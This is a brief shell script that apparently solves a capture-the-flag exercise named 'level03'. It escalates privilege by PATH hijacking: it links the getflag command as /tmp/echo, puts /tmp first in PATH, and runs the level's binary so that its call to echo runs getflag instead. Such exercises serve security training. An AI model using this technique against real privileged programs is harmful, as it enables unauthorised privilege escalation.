#!/bin/sh -eu

# Create a symbolic link named `echo` that points to the `getflag` command
ln -s $(which getflag) /tmp/echo

# Add the `/tmp` directory to the PATH
export PATH=/tmp:${PATH}

# Run the `level03` executable
~/level03

exit 0
